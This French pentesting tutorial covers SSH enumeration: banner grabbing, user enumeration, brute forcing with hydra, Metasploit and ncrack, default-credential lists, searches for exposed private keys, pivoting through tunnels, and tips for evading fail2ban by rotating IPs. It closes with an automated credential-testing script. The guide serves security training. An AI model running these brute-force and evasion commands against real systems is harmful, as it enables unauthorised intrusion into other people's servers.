# SSH Enumeration

## 🔐 Vue d'ensemble

SSH (Secure Shell) est un protocole de **connexion sécurisée à distance** très répandu sur les systèmes Unix/Linux. Bien que conçu pour être sécurisé, une mauvaise configuration peut exposer des informations critiques ou permettre des attaques.

> **💡 Explication Simple** : SSH c'est comme une porte d'entrée secrète vers un ordinateur distant. Si cette porte est mal sécurisée, on peut essayer de forcer l'entrée ou collecter des informations.

**Port SSH :** **22** (par défaut)

## ⚠️ **IMPORTANT - À propos des exemples**

> **🎯 TOUS les IPs, usernames, passwords dans ce guide sont des EXEMPLES FICTIFS !**

### 📝 Exemples vs Réalité :

**Dans le guide (EXEMPLE FICTIF) :**
```
target.com
192.168.1.100
admin, root, user
password123, admin123
```

**Dans la vraie vie, vous devez adapter :**
```
votre-vraie-cible.com
10.0.2.15
administrateur, j.martin, service.backup
[vrais usernames trouvés par énumération]
```

## 🎯 Objectifs de l'Énumération SSH

1. **Identifier la version SSH** - OpenSSH 7.4, 8.2, etc.
2. **Détecter les vulnérabilités** - CVE associés à la version
3. **Énumérer les utilisateurs** - Comptes existants sur le système
4. **Tester l'authentification** - Credentials par défaut/faibles
5. **Identifier les clés SSH** - Clés exposées ou réutilisées

## 🔍 Phase 1 : Reconnaissance SSH

### Banner Grabbing
```bash
# 1. Netcat pour banner basique
nc target.com 22

# 2. Nmap pour version détaillée
nmap -sV -p 22 target.com

# 3. SSH direct (sortira après banner)
ssh target.com
# Regardez la ligne : OpenSSH_X.X

# 4. Telnet aussi possible
telnet target.com 22
```

**Informations importantes à noter :**
- Version OpenSSH (ex: OpenSSH_7.4)
- OS sous-jacent (Ubuntu, CentOS, etc.)
- Configuration SSH visible

### 📊 Analyse de banner SSH
```
    ┌─────────────────────────────────────────────────────────┐
    │                   SSH BANNER                            │
    │                                                         │
    │ SSH-2.0-OpenSSH_7.4 Ubuntu-3ubuntu1.3                 │
    │    │      │       │        │                           │
    │    │      │       │        └─ Version OS/Distribution  │
    │    │      │       └────────── Version OpenSSH          │
    │    │      └────────────────── Software SSH             │
    │    └───────────────────────── Version du protocole    │
    │                                                         │
    │ Informations révélées:                                  │
    │ • OpenSSH version 7.4                                  │
    │ • OS: Ubuntu                                           │
    │ • Patch level: 3ubuntu1.3                             │
    │ • Vulnérabilités potentielles selon version           │
    └─────────────────────────────────────────────────────────┘
```

### Nmap Scripts SSH
```bash
# 1. Scripts d'enumeration SSH complets
nmap --script ssh-* target.com -p 22

# 2. Scripts spécifiques utiles
nmap --script ssh-hostkey target.com -p 22          # Clés host
nmap --script ssh-auth-methods target.com -p 22     # Méthodes auth
nmap --script ssh2-enum-algos target.com -p 22      # Algorithmes

# 3. Avec authentification si credentials connus
nmap --script ssh-run --script-args="ssh-run.username=user,ssh-run.password=pass,ssh-run.cmd=id" target.com
```

## 👥 Phase 2 : Énumération des Utilisateurs

### Méthodes d'Énumération Utilisateurs

#### Metasploit - SSH User Enumeration
```bash
msfconsole

# 1. Module principal d'énumération utilisateurs
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target.com
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run

# Résultat typique :
# [+] SSH - User 'admin' found
# [+] SSH - User 'root' found  
# [-] SSH - User 'test' not found
```

#### Timing Attack (CVE-2016-6210)
```bash
# Vulnerability dans OpenSSH < 7.3
# Différence de timing entre users existants/inexistants

# Script Python pour timing attack
python ssh_enum_timing.py target.com userlist.txt

# Ou avec Metasploit
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target.com
set CHECK_FALSE true    # Active timing analysis
run
```

#### Manual Username Testing
```bash
# 1. Test manuel avec noms communs
for user in root admin administrator user guest; do
    echo "Testing $user"
    timeout 3 ssh $user@target.com 2>&1 | grep -v "Connection closed"
done

# 2. Test avec wordlist
while read username; do
    timeout 3 ssh $username@target.com 2>&1 | grep -v "timeout\|Connection closed"
done < /usr/share/seclists/Usernames/Names/names.txt
```

### 📋 Listes d'utilisateurs courantes à tester
```bash
# Comptes système communs
root, admin, administrator, user, guest, operator

# Comptes de service
backup, nagios, postgres, mysql, apache, nginx, git

# Noms personnels génériques  
john, mike, admin123, test, demo, service

# Wordlists recommandées
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/metasploit/unix_users.txt
```

## 🔐 Phase 3 : Test d'Authentification

### Brute Force Attacks

#### Hydra (Le plus populaire)
```bash
# 1. Attaque avec user connu, wordlist password
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh

# 2. Wordlist users ET passwords
hydra -L users.txt -P passwords.txt target.com ssh

# 3. Avec limitations (éviter détection)
hydra -l admin -P passwords.txt -t 4 -w 3 target.com ssh
# -t 4 = 4 threads max
# -w 3 = 3 secondes d'attente

# 4. Avec utilisateur spécifique
hydra -l root -p password123 target.com ssh
```

#### Metasploit Brute Force
```bash
msfconsole

# 1. Module de brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USERNAME admin
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE true
run

# 2. Avec multiples users
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
run

# 3. Test credentials spécifiques
set USERNAME root
set PASSWORD toor
run
```

#### Ncrack
```bash
# 1. Basique avec wordlists
ncrack -p 22 --user admin -P passwords.txt target.com

# 2. Mode verbeux avec limitations
ncrack -v -p 22 -U users.txt -P passwords.txt target.com

# 3. Personnalisation timing
ncrack -p 22 --user root -P passwords.txt -T 3 target.com
```

### Credentials par Défaut à Tester
```bash
# Combinaisons classiques
root:root
root:toor  
root:password
admin:admin
admin:password
user:user
pi:raspberry        # Raspberry Pi
oracle:oracle       # Oracle systems
postgres:postgres   # PostgreSQL
```

## 🔑 Phase 4 : Énumération des Clés SSH

### Recherche de Clés SSH Exposées

#### Clés dans répertoires web accessibles
```bash
# 1. Recherche dans .git exposé
curl http://target.com/.git/
# Si accessible, chercher des clés dans l'historique

# 2. Répertoires backup web
curl http://target.com/backup/
curl http://target.com/.ssh/
curl http://target.com/keys/

# 3. Fichiers communs
curl http://target.com/id_rsa
curl http://target.com/id_dsa  
curl http://target.com/authorized_keys
```

#### Avec Gobuster pour trouver clés
```bash
# 1. Wordlist spécifique SSH
gobuster dir -u http://target.com -w ssh-keys-wordlist.txt

# Créer wordlist SSH
echo -e "id_rsa\nid_dsa\nid_ecdsa\nauthorized_keys\nknown_hosts\nssh_host_rsa_key" > ssh-keys.txt
gobuster dir -u http://target.com -w ssh-keys.txt
```

### Test des Clés Trouvées
```bash
# 1. Si clé privée trouvée (id_rsa)
chmod 600 found_id_rsa
ssh -i found_id_rsa user@target.com

# 2. Test avec différents users
for user in root admin user; do
    ssh -i found_id_rsa $user@target.com
done

# 3. Si clé avec passphrase
ssh-keygen -f found_id_rsa -y    # Extraire clé publique
# Puis brute force passphrase si nécessaire
```

## 🕵️ Phase 5 : Techniques Avancées

### SSH Configuration Analysis
```bash
# 1. Si accès obtenu, examiner la config
cat /etc/ssh/sshd_config

# Éléments sensibles à chercher :
# PermitRootLogin yes
# PasswordAuthentication yes  
# PermitEmptyPasswords yes
# X11Forwarding yes
# AllowUsers/DenyUsers

# 2. Clés host du serveur
ls -la /etc/ssh/ssh_host_*
```

### Port Knocking Detection
```bash
# 1. Si SSH semble filtré, tester port knocking
nmap -p 1000,2000,3000,22 target.com

# 2. Script automatique port knocking
#!/bin/bash
for port in 1234 5678 9999; do
    nmap -p $port target.com --max-retries 0
    sleep 1
done
nmap -p 22 target.com
```

### SSH Tunneling Reconnaissance
```bash
# 1. Si accès SSH obtenu, découvrir réseau interne
ssh user@target.com "ip route show"
ssh user@target.com "netstat -rn"

# 2. Port forwarding pour pivoting
ssh -L 8080:internal-server:80 user@target.com
# Accès via localhost:8080

# 3. SOCKS proxy pour pivoting
ssh -D 1080 user@target.com
# Configure proxy SOCKS 127.0.0.1:1080
```

## 🛡️ Phase 6 : Détection de Protections

### Fail2ban Detection
```bash
# 1. Test pour détecter fail2ban
for i in {1..5}; do
    ssh wrong_user@target.com
    sleep 1
done

# Si IP bannée, attendre et tester depuis autre IP

# 2. Éviter fail2ban
# Utiliser différentes IP sources
# Étaler les tentatives dans le temps
# Utiliser proxies/VPN
```

### Rate Limiting
```bash
# 1. Test de limitation de taux
time (ssh user@target.com &)
# Mesurer délai de réponse

# 2. Adaptation selon limitations
hydra -l admin -P passwords.txt -t 1 -w 5 target.com ssh
# 1 thread, 5 secondes d'attente
```

## 📋 Checklist Énumération SSH

### ✅ Étapes Essentielles :
1. **Banner Grabbing** - Version SSH et OS
2. **Vulnerability Check** - CVE selon version
3. **User Enumeration** - Liste des comptes existants
4. **Default Credentials** - Test des mots de passe par défaut
5. **Brute Force** - Si autorisé et pas de protection
6. **SSH Keys Search** - Clés exposées sur web/repos
7. **Configuration Analysis** - Si accès obtenu

### ✅ Vulnérabilités à Vérifier :
- **Weak Passwords** → Brute force attack
- **Default Credentials** → Immediate access
- **User Enumeration** → CVE-2016-6210 (timing)
- **Exposed SSH Keys** → Key-based authentication bypass
- **Root Login Enabled** → Direct admin access
- **Weak SSH Config** → Various misconfigurations

## 🛠️ Script d'Énumération SSH Automatisé

```bash
#!/bin/bash
# SSH Enumeration Script

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Starting SSH enumeration for $TARGET"
mkdir ${TARGET}_ssh_enum

# 1. Banner grabbing
echo "[+] Getting SSH banner..."
timeout 5 nc $TARGET 22 > ${TARGET}_ssh_enum/banner.txt 2>&1

# 2. Nmap SSH scripts
echo "[+] Running nmap SSH scripts..."
nmap --script ssh-* $TARGET -p 22 > ${TARGET}_ssh_enum/nmap_ssh.txt

# 3. User enumeration (if vulnerable)
echo "[+] Testing user enumeration..."
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $TARGET; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run; exit" > ${TARGET}_ssh_enum/user_enum.txt

# 4. Test common credentials
echo "[+] Testing common credentials..."
echo "root:root
root:toor
root:password
admin:admin
admin:password" > ${TARGET}_ssh_enum/common_creds.txt

hydra -C ${TARGET}_ssh_enum/common_creds.txt $TARGET ssh > ${TARGET}_ssh_enum/hydra_common.txt

echo "[+] SSH enumeration completed!"
echo "[+] Results saved in ${TARGET}_ssh_enum/"
```

## ⚠️ Considérations de Sécurité

### Détection et Logs
- SSH génère beaucoup de logs d'authentification
- Fail2ban est couramment utilisé pour bannir les IP
- Utiliser des délais entre tentatives
- Rotation d'IP source si possible

### Aspects Légaux
- Brute force SSH peut être considéré comme intrusion
- S'assurer d'avoir l'autorisation explicite
- Documenter les méthodes pour le rapport

### Bonnes Pratiques
- Commencer par des tests passifs (banner, vulns)
- User enumeration avant brute force
- Respect des rate limits
- Arrêter si protections détectées

---
*Cette section couvre l'énumération SSH complète. Pour l'exploitation des vulnérabilités SSH, voir la section 02-Exploitation/Réseaux/*

## Énumération SSH

## Objectif
Identifier la version du service SSH, les utilisateurs potentiels, et tester les accès faibles ou mal configurés.

---

## Commandes essentielles et explications

### 1. Banner grabbing (récupération de la bannière)
```bash
nc target.com 22
```
- **nc** : Netcat, permet de se connecter à un port réseau.
- **À quoi ça sert ?** Affiche la bannière SSH (version, parfois OS ou infos sensibles).
- **Exemple de sortie** :
```
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```
- **À surveiller** : Version obsolète, infos sur l'OS, messages personnalisés.

### 2. Détection de version avec Nmap
```bash
nmap -sV -p 22 target.com
```
- **-sV** : Détecte la version du service.
- **-p 22** : Spécifie le port SSH.
- **Exemple de sortie** :
```
22/tcp open  ssh  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```
- **À surveiller** : Version vulnérable, service inattendu sur le port 22.

### 3. Énumération des utilisateurs (si vulnérable)
```bash
hydra -L users.txt -P passwords.txt ssh://target.com
```
- **hydra** : Outil de bruteforce pour tester des combinaisons utilisateurs/mots de passe.
- **-L** : Fichier de noms d'utilisateurs.
- **-P** : Fichier de mots de passe.
- **Astuce débutant** : Utiliser des listes courtes pour ne pas se faire bloquer.

### 4. Test d'authentification par clé
```bash
ssh-keyscan target.com
```
- **ssh-keyscan** : Récupère la clé publique SSH du serveur.
- **À quoi ça sert ?** Vérifier si la clé change (signe d'attaque Man-in-the-Middle), ou préparer des attaques avancées.
- **Exemple de sortie** :
```
target.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAr...
```

---

## Conseils pour débutants
- Toujours commencer par la détection de version avant de tenter un bruteforce.
- Ne pas insister sur le bruteforce : risque de blocage ou d'alerte.
- Vérifier la politique de connexion (bannière, délai, nombre d'essais autorisés).
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - SSH](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/SSH%20Methodology)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Nmap SSH NSE Scripts](https://nmap.org/nsedoc/categories/ssh.html)

## 🗂️ Workflow d'énumération SSH
1. Scan du port 22 (Nmap)
   ↓
2. Banner grabbing et détection de version (nc, nmap -sV, ssh)
   ↓
3. Enumération des utilisateurs (Metasploit, brute force, timing attack)
   ↓
4. Test d'authentification par credentials par défaut/faibles
   ↓
5. Recherche de clés SSH exposées ou réutilisées
   ↓
6. Recherche de vulnérabilités par version
   ↓
7. Analyse et exploitation des accès obtenus

## 🛡️ Conseils OPSEC
- Limiter le nombre de tentatives de connexion pour éviter le bannissement.
- Privilégier les tests passifs avant les attaques actives.
- Ne jamais utiliser de credentials réels sans autorisation.
- Utiliser des délais entre les tentatives de brute force.

## ⚠️ Erreurs fréquentes
- Oublier de tester les credentials par défaut
- Ne pas vérifier la présence de clés SSH publiques exposées
- Lancer des scans trop agressifs qui déclenchent des alertes
- Négliger les comptes de service ou d'administration

## 💡 Astuces
- Utiliser Metasploit pour automatiser l'énumération des utilisateurs
- Croiser les résultats de plusieurs outils (hydra, nmap, Metasploit)
- Tester les credentials trouvés sur d'autres services
- Scripter la recherche de clés SSH dans les répertoires publics

## 🔗 Pour aller plus loin
- [PayloadsAllTheThings - SSH](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/SSH%20Methodology)
- [HackTricks - SSH](https://book.hacktricks.xyz/pentesting/pentesting-ssh)
- [SecLists - Wordlists SSH](https://github.com/danielmiessler/SecLists/tree/master/Usernames) 